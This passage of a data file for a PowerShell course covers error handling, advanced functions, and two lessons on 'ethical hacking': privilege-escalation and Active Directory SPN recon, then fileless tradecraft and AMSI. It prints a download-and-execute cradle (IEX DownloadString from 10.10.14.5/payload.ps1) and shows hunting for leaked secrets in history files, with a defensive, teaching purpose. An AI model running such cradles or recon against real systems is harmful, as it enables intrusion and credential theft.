          'Remember in Chapter 12 when `New-ADUser` had 8 different parameters stretched across 8 lines with backticks (`` ` ``)? There is a much cleaner, professional way called **Parameter Splatting**:\n1. Put all your parameter names (`Key`) and values (`Value`) inside a normal Hashtable (`$userParams = @{ Name = "Izaz"; Department = "Security"; Enabled = $true }`).\n2. Pass that hashtable to the cmdlet using the **`@` splat symbol instead of `$`**:\n   **`New-ADUser @userParams`**\nPowerShell automatically unpacks every key-value pair in `@userParams` as `-Key Value` parameters on the cmdlet! No backticks, easy to read, and you can even add or modify keys dynamically before calling the command.',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Always pair `try / catch` with `-ErrorAction Stop` so cmdlet failures actually enter `catch`, and use `@splatHashtable` (with `@`, not `$`) to pass clean parameter tables to cmdlets.',
      },
      {
        type: 'gotcha',
        title: 'Define with $, Splat with @!',
        body: 'When you **create** the hashtable, you use a dollar sign: `$params = @{ ... }`. When you **splat** it onto a cmdlet, you replace `$` with `@`: `New-NetFirewallRule @params`!',
      },
      {
        type: 'pro',
        title: 'Accessing the Exact Error Message Inside catch',
        body: 'Inside the `catch { ... }` block, `$_` represents the `ErrorRecord` object, and **`$_.Exception.Message`** gives you the clean, human-readable reason why the command failed.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Write-Warning',
        aliases: [],
        syntax: 'Write-Warning [-Message] <String>',
        parameters: [
          {
            name: '-Message',
            type: 'String',
            description: 'Writes a yellow warning message to the warning stream without halting execution.',
          },
        ],
        examples: ['Write-Warning "Server SRV-02 did not respond; falling back to DR node."'],
      },
    ],
    codeExamples: [
      {
        title: 'Bulletproof Try/Catch/Finally with -ErrorAction Stop and Parameter @Splatting',
        description: 'Catch a missing file error cleanly with -ErrorAction Stop and splat a hashtable onto New-NetFirewallRule.',
        code: `# 1. Try / Catch / Finally with -ErrorAction Stop
try {
  $config = Get-Content -Path 'C:\\NonExistent\\settings.json' -ErrorAction Stop
} catch {
  Write-Warning "Caught error cleanly: $($_.Exception.Message)"
} finally {
  Write-Output "Finally block always runs (cleanup / closing connections)."
}

# 2. Parameter Splatting (@ruleParams instead of messy backticks!)
$ruleParams = @{
  DisplayName = 'Allow HTTPS Web Traffic'
  Direction   = 'Inbound'
  Protocol    = 'TCP'
  LocalPort   = 443
  Profile     = @('Domain', 'Private')
  Action      = 'Allow'
  WhatIf      = $true
}

New-NetFirewallRule @ruleParams`,
        output: `WARNING: Caught error cleanly: Cannot find path 'C:\\NonExistent\\settings.json' because it does not exist.
Finally block always runs (cleanup / closing connections).
What if: Creating firewall rule 'Allow HTTPS Web Traffic'.`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Writing `try { Get-Service NonExistentService } catch { "Failed" }` without `-ErrorAction Stop`.',
        cause: '`Get-Service` emits a non-terminating error by default, so PowerShell prints red text and skips the `catch` block completely.',
        fix: 'Add `-ErrorAction Stop` (`Get-Service NonExistentService -ErrorAction Stop`).',
      },
    ],
    tryItYourself: [
      'Run `try { Get-Item C:\\NoSuchFile.txt } catch { "Caught!" }` (notice `Caught!` does NOT run!), and then add `-ErrorAction Stop` (`try { Get-Item C:\\NoSuchFile.txt -ErrorAction Stop } catch { "Caught!" }`) and watch `Caught!` trigger immediately!',
      'Create `$p = @{ Name = "explorer"; ErrorAction = "SilentlyContinue" }` and run `Get-Process @p`.',
    ],
    knowledgeCheck: [
      {
        question: 'Why must you add `-ErrorAction Stop` to a cmdlet inside a `try { ... }` block?',
        options: [
          'To make the cmdlet run faster',
          'Because cmdlets emit non-terminating errors by default, which do not trigger the catch block unless converted to terminating errors with -ErrorAction Stop',
          'Because try blocks do not allow parameters',
          'To delete the error log',
        ],
        correctIndex: 1,
        explanation: 'try/catch only intercepts terminating exceptions; -ErrorAction Stop promotes non-terminating cmdlet errors into terminating errors.',
      },
      {
        question: 'If you define a hashtable `$mailParams = @{ To = "admin@corp.local"; Subject = "Alert" }`, how do you splat it onto `Send-MailMessage`?',
        options: [
          'Send-MailMessage $mailParams',
          'Send-MailMessage @mailParams',
          'Send-MailMessage &mailParams',
          'Send-MailMessage %mailParams',
        ],
        correctIndex: 1,
        explanation: 'Parameter splatting uses the @ symbol (@mailParams) to unpack hashtable keys and values as named cmdlet parameters.',
      },
    ],
  },

  {
    id: '14-2',
    chapterId: 'chapter-14',
    slug: 'advanced-functions-toolmaking',
    title: 'Reusable Functions & Advanced Toolmaking with [CmdletBinding()]',
    subtitle: 'Turn your functions into first-class cmdlets that support -Verbose, -WhatIf, and streaming pipeline input',
    estimatedMinutes: 30,
    oneSentenceSummary:
      'Adding `[CmdletBinding(SupportsShouldProcess)]`, `[Parameter(Mandatory, ValueFromPipeline)]`, and `begin / process / end` blocks upgrades a simple function into an enterprise Advanced Function that behaves identically to a compiled C# cmdlet.',
    summary:
      'In this lesson, you graduate from "script writer" to **Toolmaker**. We start with basic reusable functions and comment-based help (`.SYNOPSIS`, `.EXAMPLE` so `Get-Help` works on your own code!), and then upgrade them into **Advanced Functions** using `[CmdletBinding()]` - unlocking automatic `-Verbose`, `-ErrorAction`, `-WhatIf` support, parameter validation (`[ValidateSet()]`), and real streaming pipeline input (`process { }`).',
    whyItMatters:
      'When you build tools for your team or package your own PowerShell module, writing Advanced Functions with `[CmdletBinding()]` means anyone can pipe objects into your function, run `Get-Help Your-Function -Examples`, or test it with `-WhatIf`!',
    learningObjectives: [
      'Write functions named with approved `Verb-SingularNoun` conventions and include Comment-Based Help (`.SYNOPSIS`, `.DESCRIPTION`, `.EXAMPLE`)',
      'Upgrade a function to an Advanced Function using `[CmdletBinding(SupportsShouldProcess)]` and `param(...)`',
      'Decorate parameters with `[Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]` and `[ValidateSet()]`',
      'Explain how `begin { }`, `process { }` (runs once per piped object!), and `end { }` blocks process streaming pipeline input',
    ],
    keyTerms: [
      'Comment-Based Help (.SYNOPSIS, .EXAMPLE)',
      '[CmdletBinding(SupportsShouldProcess)]',
      '[Parameter(Mandatory, ValueFromPipeline)]',
      '[ValidateSet()] & [ValidateNotNullOrEmpty()]',
      'begin / process / end Blocks',
      '$PSCmdlet.ShouldProcess()',
    ],
    conceptSections: [
      {
        heading: 'From Basic Function to Self-Documented Tool (Comment-Based Help)',
        body: [
          'Always name your functions using Microsoft’s `ApprovedVerb-SingularNoun` rule (`Get-ServerSummary`, `Test-PortHealth`). Even better, if you place a comment block `<# .SYNOPSIS ... .EXAMPLE ... #>` inside your function, **PowerShell’s built-in `Get-Help` command automatically parses it** so anyone on your team can run `Get-Help Get-ServerSummary -Examples`!',
        ],
      },
      {
        heading: 'The Magic of [CmdletBinding()] and Parameter Validation',
        body: [
          'Placing **`[CmdletBinding()]`** right above `param(...)` transforms a simple function into an **Advanced Function**:\n• Automatically gives your function every common parameter (`-Verbose`, `-Debug`, `-ErrorAction`, `-WarningAction`).\n• Adding **`[CmdletBinding(SupportsShouldProcess)]`** unlocks **`-WhatIf`** and **`-Confirm`** inside your function (checked via `if ($PSCmdlet.ShouldProcess($target, "Action")) { ... }`)!\n• Inside `param(...)`, you can add attributes like:\n  - **`[Parameter(Mandatory = $true, ValueFromPipeline = $true)]`** - Prompts the user if omitted AND accepts piped input!\n  - **`[ValidateSet("Dev", "Staging", "Prod")]`** - Restricts values to that exact list and gives free `Tab` auto-completion!',
        ],
      },
      {
        heading: 'Handling the Pipeline: begin { }, process { }, and end { }',
        body: [
          'If someone pipes 50 server names into your function (`"SRV01", "SRV02" | Get-ServerSummary`), a normal function without a `process` block only processes the *last* item! Advanced functions use three lifecycle blocks:\n• **`begin { }`:** Runs **once** at the very start before the first object arrives (great for headers or database connections).\n• **`process { }`:** Runs **once for every single object** coming down the pipeline conveyor belt!\n• **`end { }`:** Runs **once** after the last object has finished.',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: '`[CmdletBinding()]` unlocks `-Verbose` and `-ErrorAction`; `ValueFromPipeline` inside a `process { }` block lets your function stream objects from the pipe; and `SupportsShouldProcess` unlocks `-WhatIf`.',
      },
      {
        type: 'try',
        title: 'Tab-Complete Your Own [ValidateSet()] Parameter!',
        body: 'When you add `[ValidateSet("Domain", "Private", "Public")][string]$Profile` to your function’s `param()` block, PowerShell automatically Tab-completes `"Domain"`, `"Private"`, and `"Public"` on the command line!',
      },
      {
        type: 'gotcha',
        title: 'Why ValueFromPipeline Needs a process { } Block',
        body: 'Without a `process { ... }` block, your function body is treated as an `end { }` block, which only sees the very last item from the pipeline! Always wrap pipeline processing logic inside `process { }`.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Write-Verbose',
        aliases: [],
        syntax: 'Write-Verbose [-Message] <String>',
        parameters: [
          {
            name: '-Message',
            type: 'String',
            description: 'Prints diagnostic trace output ONLY when the caller passes -Verbose to your [CmdletBinding()] function.',
          },
        ],
        examples: ['Write-Verbose "Connecting to $ComputerName..."'],
      },
    ],
    codeExamples: [
      {
        title: 'A Complete Enterprise Advanced Function with [CmdletBinding()], Pipeline Input & -WhatIf',
        description: 'Build an advanced function with Comment-Based Help, parameter validation, pipeline streaming, and -WhatIf support.',
        code: `function Restart-LabService {
  <#
    .SYNOPSIS
    Safely restarts one or more services with -Verbose and -WhatIf support.
    .EXAMPLE
    'wuauserv', 'bits' | Restart-LabService -Environment Lab -WhatIf
  #>
  [CmdletBinding(SupportsShouldProcess = $true)]
  param (
    [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
    [string]$Name,

    [Parameter(Mandatory = $false)]
    [ValidateSet('Dev', 'Lab', 'Prod')]
    [string]$Environment = 'Lab'
  )

  begin {
    Write-Verbose "Starting service maintenance in [$Environment] environment..."
  }

  process {
    Write-Verbose "Inspecting service: $Name"
    if ($PSCmdlet.ShouldProcess("Service '$Name' ($Environment)", "Restart-Service")) {
      Get-Service -Name $Name -ErrorAction Stop | Select-Object Name, Status, StartType
    }
  }

  end {
    Write-Verbose "Completed service maintenance batch."
  }
}

# Test pipeline streaming, -Verbose, and -WhatIf dry run!
'wuauserv', 'bits' | Restart-LabService -Environment Lab -Verbose -WhatIf`,
        output: `VERBOSE: Starting service maintenance in [Lab] environment...
VERBOSE: Inspecting service: wuauserv
What if: Performing the operation "Restart-Service" on target "Service 'wuauserv' (Lab)".
VERBOSE: Inspecting service: bits
What if: Performing the operation "Restart-Service" on target "Service 'bits' (Lab)".
VERBOSE: Completed service maintenance batch.`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Using `Write-Host "Debug info"` inside an advanced function instead of `Write-Verbose "Debug info"`.',
        cause: '`Write-Host` prints noisy text every time, whereas `Write-Verbose` stays quiet by default and only prints when the user asks for `-Verbose`.',
        fix: 'Use `Write-Verbose` inside `[CmdletBinding()]` functions.',
      },
    ],
    tryItYourself: [
      'Copy the `Restart-LabService` function into your console and run `Get-Help Restart-LabService -Examples` to see your own Comment-Based Help rendered just like a native Microsoft cmdlet!',
      'Try passing `-Environment InvalidEnv` to see `[ValidateSet()]` automatically block invalid values.',
    ],
    knowledgeCheck: [
      {
        question: 'In an Advanced Function that accepts pipeline input (`ValueFromPipeline = $true`), which block executes once for EVERY object piped into the function?',
        options: ['begin { }', 'process { }', 'end { }', 'param ( )'],
        correctIndex: 1,
        explanation: 'begin runs once before pipeline input starts, process runs once for each incoming pipeline object, and end runs once after all objects are processed.',
      },
      {
        question: 'Which attribute on `[CmdletBinding(...)]` unlocks built-in `-WhatIf` and `-Confirm` support for your custom function?',
        options: [
          'SupportsShouldProcess = $true',
          'EnableWhatIf = $true',
          'AllowSimulation = $true',
          'SafeMode = $true',
        ],
        correctIndex: 0,
        explanation: '[CmdletBinding(SupportsShouldProcess = $true)] paired with $PSCmdlet.ShouldProcess() adds native -WhatIf and -Confirm parameters to your function.',
      },
    ],
  },

  // ==========================================================================
  // CHAPTER 15: POWERSHELL FOR ETHICAL HACKERS & OFFENSIVE SECURITY
  // ==========================================================================
  {
    id: '15-1',
    chapterId: 'chapter-15',
    slug: 'offensive-recon-and-ad-enum',
    title: 'Ethical Hacking Recon: Local Situational Awareness & Native ADSI Domain Hunting',
    subtitle: 'Enumerate privileges, unquoted service paths, open ports, and Active Directory SPNs without installing a single external tool',
    estimatedMinutes: 35,
    oneSentenceSummary:
      'Ethical hackers and red teamers "Live Off the Land" using built-in PowerShell and `.NET` classes (`[adsisearcher]`) to enumerate local escalation paths, scan ports, and discover Kerberoastable Active Directory accounts without installing any third-party tools.',
    summary:
      'Welcome to Track 4! Why has PowerShell been the #1 tool in both Red Team engagements and Blue Team incident response for the past decade? Because it is pre-installed on every Windows machine and has full access to `.NET` and WMI/CIM, a technique security pros call **Living Off the Land (LOTL / LOLBins)**. In this lesson, we put on our Ethical Hacker hat to perform local privilege-escalation recon (token privileges, unquoted service paths, listening ports) and enumerate Active Directory Domain Admins and Kerberoastable Service Principal Names (SPNs) using native `.NET [adsisearcher]` - even on a workstation that doesn’t have the RSAT `ActiveDirectory` module installed!',
    whyItMatters:
      'You cannot defend an Active Directory forest until you see how easily an attacker who lands on a single standard-user workstation can map your entire domain and find misconfigured service accounts in 5 seconds using built-in `.NET` classes.',
    learningObjectives: [
      'Perform local Situational Awareness & Privilege Escalation recon (checking `whoami /priv`, local admins, listening TCP connections, and Unquoted Service Paths)',
      'Explain why attackers use native `.NET [adsisearcher]` (`System.DirectoryServices.DirectorySearcher`) when the RSAT `ActiveDirectory` module is not installed',
      'Query Active Directory for privileged groups and accounts with `ServicePrincipalName` (SPN) values to audit **Kerberoasting** exposure',
      'Audit file and registry permissions using `Get-Acl` to spot weak ACLs on service binaries',
    ],
    keyTerms: [
      'Living Off the Land (LOTL / LOLBins)',
      'Unquoted Service Path Vulnerability',
      '[adsisearcher] (Native .NET LDAP Searcher)',
      'Service Principal Name (SPN)',
      'Kerberoasting (T1558.003)',
      'Get-Acl (Access Control List Audit)',
    ],
    conceptSections: [
      {
        heading: 'Local Situational Awareness & Finding Unquoted Service Paths',
        body: [
          'When an ethical hacker or penetration tester gains command-line access to a Windows machine during an authorized assessment, they don’t immediately drop noisy `.exe` malware onto the disk (which antivirus would flag instantly). Instead, they run native PowerShell one-liners to answer four questions:\n1. **Who am I and what token privileges do I hold?** (`whoami /all` - looking for dangerous privileges like `SeImpersonatePrivilege` or `SeDebugPrivilege`).\n2. **What services are running as `LocalSystem` with an Unquoted Service Path?**\n   If a service runs as `LocalSystem` and its executable path has spaces *without quotes* - for example, `C:\\Program Files\\Custom App\\Service Folder\\svc.exe` - Windows literally tries to execute `C:\\Program.exe`, then `C:\\Program Files\\Custom.exe`, and then `C:\\Program Files\\Custom App\\Service.exe`! If a standard user has write permission to any of those folders (`Get-Acl`), they can escalate straight to `SYSTEM`.\n3. **What internal ports and connections are active?** (`Get-NetTCPConnection -State Listen, Established`).\n4. **Did an admin leave plain-text passwords inside PowerShell ConsoleHost history or `.xml`/`.ps1` files?**\n   Checking `(Get-PSReadLineOption).HistorySavePath` (`ConsoleHost_history.txt`) and `Select-String -Pattern "password|credential"`!',
        ],
      },
      {
        heading: 'Domain Recon Without RSAT: The [adsisearcher] Superpower',
        body: [
          'Wait, in Chapter 12, we used `Get-ADUser` from the `ActiveDirectory` RSAT module. What if you land on a standard employee laptop that **does not have RSAT installed**? Can you still query Active Directory?',
          '**Yes!** Every Windows machine has `.NET` built in, and PowerShell provides the **`[adsisearcher]`** type accelerator (`System.DirectoryServices.DirectorySearcher`). Without installing a single module or requiring Admin rights, any domain user can query LDAP directly:\n• Find all members of `Domain Admins`:\n  `([adsisearcher]"(samAccountName=Domain Admins)").FindOne().Properties.member`\n• **Audit for Kerberoastable Service Accounts:**\n  In Active Directory, any user account with a non-empty **`servicePrincipalName` (SPN)** attribute can have its Kerberos service ticket (TGS) requested by *any* authenticated domain user (`(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))`). If that service account has a weak password, an attacker can crack the ticket offline (**Kerberoasting**)! Auditing SPNs with PowerShell lets you find these accounts first and enforce 25+ character passwords or Group Managed Service Accounts (gMSAs).',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Ethical hackers use native WMI/CIM to hunt local misconfigurations (like Unquoted Service Paths and `ConsoleHost_history.txt`) and `.NET [adsisearcher]` to enumerate Active Directory and Kerberoastable SPNs without needing RSAT.',
      },
      {
        type: 'danger',
        title: 'Ethical & Authorized Use Only',
        body: 'Every technique in this chapter is taught so you can audit your own infrastructure, succeed in authorized penetration tests and CTFs, and recognize adversary tradecraft in your SOC logs.',
      },
      {
        type: 'pro',
        title: 'How to Fix Kerberoasting Exposure',
        body: 'When your audit script finds user accounts with SPNs, migrate them to **Group Managed Service Accounts (gMSAs)** (`New-ADServiceAccount`), which use 120-character random passwords managed automatically by Active Directory!',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Get-NetTCPConnection',
        aliases: [],
        syntax: 'Get-NetTCPConnection [-State <State[]>] [-LocalPort <UInt16[]>]',
        parameters: [
          {
            name: '-State',
            type: 'State[]',
            description: 'Filters TCP sockets by state (Listen, Established, TimeWait) and includes the OwningProcess PID.',
          },
        ],
        examples: [
          'Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess',
        ],
      },
      {
        cmdlet: 'Get-Acl',
        aliases: [],
        syntax: 'Get-Acl [[-Path] <String[]>]',
        parameters: [
          {
            name: '-Path',
            type: 'String[]',
            description: 'Retrieves the security descriptor (Access Control List / permissions) of a file, folder, or registry key.',
          },
        ],
        examples: ['(Get-Acl C:\\Windows\\System32).Access'],
      },
    ],
    codeExamples: [
      {
        title: 'Ethical Hacking Recon: Unquoted Service Paths, History Files & Native [adsisearcher] SPN Hunting',
        description: 'Audit a machine for Unquoted Service Paths, map listening TCP ports to process names, and find Kerberoastable SPN accounts via [adsisearcher].',
        code: `# 1. Hunt for Unquoted Service Paths running as LocalSystem (Privilege Escalation Audit)
Get-CimInstance Win32_Service |
  Where-Object {
    $_.StartName -eq 'LocalSystem' -and
    $_.PathName -notmatch '^"' -and
    $_.PathName -notmatch '^C:\\\\Windows\\\\' -and
    $_.PathName -match ' '
  } | Select-Object Name, StartMode, State, PathName

# 2. Map all Listening TCP Ports to their live Process Name
Get-NetTCPConnection -State Listen |
  Select-Object -First 5 LocalAddress, LocalPort, OwningProcess, @{
    Name       = 'ProcessName'
    Expression = { (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name }
  }

# 3. Check PSReadLine command history file location (where admins often leak typed secrets!)
$historyPath = (Get-PSReadLineOption).HistorySavePath
Write-Output "PSReadLine History File: $historyPath"

# 4. Native .NET [adsisearcher] LDAP query for User Accounts with SPNs (Kerberoasting Audit - No RSAT needed!)
$searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
# $searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }`,
        output: `LocalAddress LocalPort OwningProcess ProcessName
------------ --------- ------------- -----------
0.0.0.0            135          1024 svchost
0.0.0.0            445             4 System
0.0.0.0           5985          1892 svchost
127.0.0.1         8888          6140 pwsh

PSReadLine History File: C:\\Users\\izaz\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Assuming that uninstalling the RSAT `ActiveDirectory` PowerShell module on workstations stops attackers from querying Active Directory.',
        cause: 'Any domain machine can use built-in `.NET [adsisearcher]` (`System.DirectoryServices.DirectorySearcher`) to run raw LDAP queries without RSAT.',
        fix: 'Monitor LDAP queries on Domain Controllers (Event ID 1644) and harden privileged accounts and SPNs.',
      },
    ],
    tryItYourself: [
      'Run the Listening TCP Ports one-liner above on your machine to see which process owns every open port.',
      'Check your own `ConsoleHost_history.txt` path with `(Get-PSReadLineOption).HistorySavePath` to see how PSReadLine records historical commands across sessions.',
    ],
    knowledgeCheck: [
      {
        question: 'How can an ethical hacker or red teamer query Active Directory users and SPNs from a domain workstation that does NOT have the RSAT ActiveDirectory module installed?',
        options: [
          'It is impossible without RSAT',
          'By using the built-in .NET [adsisearcher] (System.DirectoryServices.DirectorySearcher) type accelerator',
          'By opening Paint',
          'By running Format-Table',
        ],
        correctIndex: 1,
        explanation: '[adsisearcher] is built into .NET on every Windows machine and executes LDAP queries directly against the Domain Controller.',
      },
      {
        question: 'What causes an "Unquoted Service Path" privilege escalation vulnerability on Windows?',
        options: [
          'A service running as LocalSystem whose executable path contains spaces (outside C:\\Windows) without surrounding quotation marks, allowing an attacker with folder write access to plant a hijacked binary',
          'A service whose name is shorter than 5 letters',
          'A service that uses HTTPS',
          'A service that is currently Stopped',
        ],
        correctIndex: 0,
        explanation: 'When a service path with spaces is unquoted (e.g., C:\\Program Files\\My Service\\app.exe), Windows sequentially tries C:\\Program.exe and C:\\Program Files\\My.exe before the full path.',
      },
    ],
  },

  {
    id: '15-2',
    chapterId: 'chapter-15',
    slug: 'in-memory-cradles-and-evasion',
    title: 'Fileless Tradecraft: In-Memory Cradles (IEX), -EncodedCommand & How AMSI Works',
    subtitle: 'Deconstruct fileless PowerShell execution, decode Base64 payloads, and trace how AMSI catches obfuscated scripts',
    estimatedMinutes: 30,
    diagramId: 'offensive-killchain-svg',
    oneSentenceSummary:
      'Attackers use In-Memory Cradles (`IEX`) and Base64 (`-EncodedCommand`) to avoid writing `.ps1` files to disk, but Windows defeats both tricks by passing the final decoded code in RAM directly to **AMSI (Antimalware Scan Interface)** and **Event ID 4104** right before execution!',
    summary:
      'Why do 80% of real-world PowerShell incident reports involve commands starting with `powershell.exe -nop -w hidden -enc ...` or `IEX (New-Object Net.WebClient).DownloadString(...)`? In this lesson, we deconstruct **Fileless In-Memory Download Cradles**, learn how to encode and decode `-EncodedCommand` Base64 payloads in 5 seconds, and see why **AMSI (Antimalware Scan Interface)** catches obfuscated payloads in memory right at the finish line.',
    whyItMatters:
      'When you are on call in a Security Operations Center (SOC) and an alert triggers on an `-EncodedCommand` string, you need to decode that Base64 payload safely in seconds and understand whether AMSI and Script Block Logging intercepted it.',
    learningObjectives: [
      'Deconstruct a classic **Fileless In-Memory Download Cradle** (`Invoke-Expression` / `IEX`) and explain why it avoids touching the hard drive',
      'Decode and inspect any `-EncodedCommand` (`-enc`) Base64 string using `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(...))`',
      'Explain why `.NET` uses **UTF-16LE (`Unicode`)** encoding for PowerShell’s `-EncodedCommand` parameter',
      'Trace how **AMSI (`amsi.dll`)** sits inside the PowerShell process and scans fully de-obfuscated code in memory right before `IEX` executes it',
    ],
    keyTerms: [
      'Fileless Malware / In-Memory Cradle',
      'Invoke-Expression (IEX)',
      '-EncodedCommand (-enc / Base64 UTF-16LE)',
      'AMSI (Antimalware Scan Interface / amsi.dll)',
      'Dynamic De-obfuscation Inspection',
    ],
    conceptSections: [
      {
        heading: 'Anatomy of an In-Memory Download Cradle (Invoke-Expression / IEX)',
        body: [
          'Traditional antivirus scanned files written to the hard drive (`C:\\Temp\\evil.exe`). To evade disk-based scanners, attackers turned to **Fileless Execution** using **`Invoke-Expression`** (alias **`IEX`**), a cmdlet that takes any string in RAM and executes it as live PowerShell code:\n`IEX (New-Object System.Net.WebClient).DownloadString("http://10.10.14.5/payload.ps1")`\n*(or `Invoke-RestMethod http://10.10.14.5/payload.ps1 | Invoke-Expression`)*',
          'Notice what happened: `DownloadString()` fetched the script over HTTP directly into a string in **RAM**, and `IEX` executed it straight from RAM without ever saving a `.ps1` file to the SSD! And as a defender, remember: **Legitimate production scripts almost NEVER need `Invoke-Expression` (`IEX`)** - if you see `IEX` in your logs, investigate immediately.',
        ],
      },
      {
        heading: 'Decoding -EncodedCommand (-enc): Why Base64 Is NOT Encryption',
        body: [
          'Why did Microsoft add **`-EncodedCommand`** (shortened as `-enc` or `-e`) to `powershell.exe`? To help legitimate system administrators pass complex scripts containing nested quotes and special characters across command lines without `cmd.exe` mangling the quotes!',
          'Attackers quickly abused `-EncodedCommand` thinking Base64 would hide their commands from analysts. Here is the truth:\n1. **Base64 is an encoding, NOT encryption** - there is no secret key, and any analyst can reverse it in 2 seconds.\n2. PowerShell’s `-EncodedCommand` uses **16-bit Unicode (`UTF-16LE`)**, which is why every regular ASCII letter in a PowerShell Base64 string is padded with a null byte (`0x00`), creating lots of `A` characters in the Base64 string (`SQBFAFgA...`)!\n• **How to Decode Any Suspicious `-enc` String Safely (Without Running It!):**\n  `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("SQBFAFgA"))`',
        ],
      },
      {
        heading: 'How AMSI (Antimalware Scan Interface) Defeats Obfuscation in Memory',
        body: [
          'If an attacker Base64-encodes a script, splits strings into pieces (`"In" + "voke-Mim" + "ikatz"`), and runs it entirely in RAM via `IEX`, how does Windows Defender still catch it?',
          'Look at the **Red Team vs. Blue Team Kill-Chain SVG diagram** below! Starting in Windows 10 / Server 2016, Microsoft embedded **`amsi.dll` (Antimalware Scan Interface)** directly inside every `powershell.exe` and `pwsh.exe` process.\nNo matter how many layers of Base64 or string obfuscation an attacker wraps around their code, **PowerShell itself has to unpack the plain-text instructions at the very last microsecond before executing them.** Right at that choke point, inside `Invoke-Expression` and the script engine, PowerShell hands the **fully decoded, plain-text buffer in RAM** to `AmsiScanBuffer()`, allowing Windows Defender (or CrowdStrike/SentinelOne) to inspect and block the payload before a single instruction runs!',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: '`-EncodedCommand` is just reversible UTF-16LE Base64, and **AMSI (`amsi.dll`)** inspects in-memory `IEX` payloads *after* all decoding and de-obfuscation have already happened.',
      },
      {
        type: 'try',
        title: 'Encode and Decode a Safe Command Right Now',
        body: 'Run the Base64 encoder/decoder example below to see why UTF-16LE Base64 strings always look like `RwBlAHQALQ...` (with capital `A`s between letters) and how to decode them in one line.',
      },
      {
        type: 'danger',
        title: 'Never Pipe Unknown Base64 Strings Into IEX!',
        body: 'When analyzing a suspicious `-EncodedCommand` from an alert, always pipe the decoded output to **`Write-Output`** or a text file, never to `IEX` or `Invoke-Expression`!',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Invoke-RestMethod',
        aliases: ['irm'],
        syntax: 'Invoke-RestMethod [-Uri] <Uri> [-Method <WebRequestMethod>]',
        parameters: [
          {
            name: '-Uri',
            type: 'Uri',
            description: 'The HTTP/HTTPS URL to query (automatically parses JSON or XML responses into PowerShell objects!).',
          },
        ],
        examples: ['Invoke-RestMethod -Uri "https://api.github.com/zen"'],
      },
    ],
    codeExamples: [
      {
        title: 'Forensic Decoding of -EncodedCommand Payloads & Inspecting Loaded amsi.dll',
        description: 'Encode a command into UTF-16LE Base64, decode a suspicious -enc string safely, and verify that amsi.dll is loaded inside your PowerShell process.',
        code: `# 1. How PowerShell encodes a command for -EncodedCommand (UTF-16LE / Unicode)
$plainCommand = 'Get-Service -Name WinRM'
$bytes        = [System.Text.Encoding]::Unicode.GetBytes($plainCommand)
$encodedB64   = [System.Convert]::ToBase64String($bytes)
Write-Output "Encoded (-enc) : $encodedB64"

# 2. SOC Analyst One-Liner: Safely DECODE a suspicious -EncodedCommand string without executing it!
$decodedText  = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedB64))
Write-Output "Decoded Safely : $decodedText"

# 3. Verify that AMSI (amsi.dll) is loaded inside your current PowerShell process memory
(Get-Process -Id $PID).Modules |
  Where-Object ModuleName -eq 'amsi.dll' |
  Select-Object ModuleName, FileName, Size`,
        output: `Encoded (-enc) : RwBlAHQALQBTAGUAcgB2AGkAYwBlACAALQBOAGEAbQBlACAAVwBpAG4AUgBNAA==
Decoded Safely : Get-Service -Name WinRM

ModuleName FileName                        Size
---------- --------                        ----
amsi.dll   C:\\WINDOWS\\SYSTEM32\\amsi.dll  135168`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Using `[System.Text.Encoding]::UTF8` when decoding a PowerShell `-EncodedCommand` string and seeing spaces or null bytes between every character.',
        cause: '`powershell.exe -EncodedCommand` always uses 16-bit **`[System.Text.Encoding]::Unicode`** (`UTF-16LE`), not `UTF8`.',
        fix: 'Always use `[System.Text.Encoding]::Unicode.GetString(...)` when decoding `-EncodedCommand` strings.',
      },
    ],
    tryItYourself: [
      'Decode this mystery Base64 string using our SOC one-liner: `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("RwBlAHQALQBEAGEAdABlAA=="))`.',
      'Run `(Get-Process -Id $PID).Modules | Where-Object ModuleName -eq "amsi.dll"` to see `amsi.dll` protecting your own PowerShell session.',
    ],
    knowledgeCheck: [
      {
        question: 'Why does AMSI (Antimalware Scan Interface) defeat Base64 encoding and string concatenation obfuscation in PowerShell?',
        options: [
          'Because AMSI blocks the keyboard from typing Base64',
          'Because amsi.dll hooks directly into the PowerShell engine in memory and scans the final, fully de-obfuscated script text right before execution',
          'Because AMSI only scans .txt files on disk',
          'Because PowerShell cannot decode Base64',
        ],
        correctIndex: 1,
        explanation: 'No matter how a script is obfuscated in transit, the PowerShell interpreter must reconstruct the plain-text command in memory to execute it, which is the exact moment AMSI scans the buffer.',
      },
      {
        question: 'Which .NET text encoding does `powershell.exe -EncodedCommand` use?',
        options: [
          'ASCII (7-bit)',
          'Unicode (UTF-16LE)',
          'EBCDIC',
          'Hexadecimal',
        ],
        correctIndex: 1,
        explanation: 'PowerShell -EncodedCommand expects Base64-encoded UTF-16LE ([System.Text.Encoding]::Unicode) bytes.',
      },
    ],
  },

  // ==========================================================================
